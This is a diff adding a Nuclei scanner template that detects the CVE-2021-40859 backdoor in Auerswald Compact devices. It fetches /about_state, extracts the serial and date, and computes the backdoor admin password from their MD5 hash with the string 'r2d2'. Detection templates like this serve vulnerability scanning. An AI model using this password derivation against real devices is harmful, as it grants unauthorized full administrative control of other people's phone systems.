@@ -1,0 +1,62 @@
+id: cve-2021-40859
+info:
+  name: Compact Backdoors Detection (CVE-2021-40859)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Auerswald Compact series devices have backdoor vulnerabilities. These backdoors allow an attacker to have full administrative access to the device.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-40859
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-40859
+    cnnvd-id: CNNVD-202112-390
+  tags: backdoor, critical
+
+http:
+  - raw:
+      - |
+        GET /about_state HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "pbx"
+          - "dongleStatus:0"
+          - "macaddr"
+    extractors:
+      - type: regex
+        name: serial
+        part: body
+        regex:
+          - "\"serial\":\"(.*?)\","
+        internal: true
+      - type: regex
+        name: date
+        part: body
+        regex:
+          - "\"date\":\"(.*?)\","
+        internal: true
+
+  - raw:
+      - |
+        GET /about_state HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: dsl
+        name: password
+        dsl:
+          - "to_lower(md5(concat(serial, 'r2d2', date)))[:7]"
